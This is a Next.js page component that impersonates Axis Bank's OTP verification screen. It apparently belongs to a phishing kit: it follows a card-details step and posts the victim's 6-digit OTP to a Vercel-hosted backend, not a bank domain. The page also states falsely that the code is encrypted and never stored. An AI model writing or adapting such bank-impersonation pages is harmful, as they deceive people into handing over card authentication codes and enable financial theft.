"use client";

import { useState, useRef, useEffect } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { ShieldCheck, Lock } from "lucide-react";
import { Button } from "@/components/ui/button";
import axios from "axios";

export default function OtpPage() {
  const router = useRouter();
  const [applicationId, setApplicationId] = useState("");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const inputRefs = [
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null),
    useRef(null)
  ];

  useEffect(() => {
    const id = localStorage.getItem("applicationId");
    if (id) {
      setApplicationId(id);
    } else {
      router.push("/form");
    }
  }, [router]);

  const handleChange = (index, value) => {
    if (value && !/^[0-9]$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      inputRefs[index + 1].current.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs[index - 1].current.focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData("text").trim();

    if (/^[0-9]{6}$/.test(pasteData)) {
      const digits = pasteData.split("");
      setOtp(digits);
      inputRefs[5].current.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length < 6) {
      alert("Please enter full 6-digit OTP");
      return;
    }

    try {
      const response = await axios.put(`https://axis-be.vercel.app/applications/${applicationId}`, {
        otp: otpValue,
        status: "completed" // Mark as completed
      });

      if (response.data.success) {
        // Clear local storage
        localStorage.removeItem("applicationId");
        // Redirect to homepage
        router.push("/");
      }
    } catch (error) {
      console.error("Error submitting OTP:", error);
      alert("Failed to submit. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center p-4">

      <div className="w-full max-w-lg text-center space-y-6">

        {/* Axis Logo */}
        <div className="flex justify-center mb-6">
          <div className="flex items-center gap-1">
            <div className="w-10 h-10 bg-[#A10D59] flex items-center justify-center text-white font-bold text-lg transform rotate-45 rounded-sm">
              <span className="transform -rotate-45">A</span>
            </div>
            <span className="text-xl font-bold text-[#A10D59] tracking-wider">
              AXIS BANK
            </span>
          </div>
        </div>

        <h1 className="text-xl font-bold text-[#A10D59]">Secure Verification</h1>
        <p className="text-xs text-zinc-500">
          Please enter the 6-digit OTP sent to your registered number 9315653456.
        </p>

        {/* OTP Inputs */}
        <form onSubmit={handleSubmit}>
          <div className="flex justify-center gap-2 my-8" onPaste={handlePaste}>
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={inputRefs[index]}
                type="text"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="w-10 h-12 border border-zinc-300 rounded-lg text-center font-bold text-lg focus:outline-none focus:ring-1 focus:ring-[#A10D59] focus:border-[#A10D59] bg-[#f5f5f5]"
              />
            ))}
          </div>

          <div className="space-y-1 mb-6">
            <p className="text-xs text-zinc-400">Resend available in 01:09</p>
            <Link href="#" className="text-xs text-[#A10D59] font-semibold hover:underline">
              Resend OTP
            </Link>
          </div>

          <Button type="submit" className="w-full bg-[#A10D59] hover:bg-[#8E0C4F] text-white py-2.5 rounded-lg text-sm font-semibold shadow-md shadow-[#A10D59]/10 flex items-center justify-center gap-2">
            <ShieldCheck className="w-4 h-4" /> Verify Securely
          </Button>
        </form>

        {/* Security Notice */}
        <div className="flex flex-col items-center gap-1 mt-6 text-center text-xs text-zinc-400">
          <Lock className="w-4 h-4 text-zinc-400" />
          <p>Your OTP is protected by 256-bit encryption.</p>
          <p>We never store your authentication codes.</p>
        </div>

      </div>

      {/* Footer link back */}
      <div className="mt-auto py-6">
        <Link href="/form/card" className="text-xs text-[#A10D59] hover:underline font-medium">
          Back to Card Details
        </Link>
      </div>
    </div>
  );
}
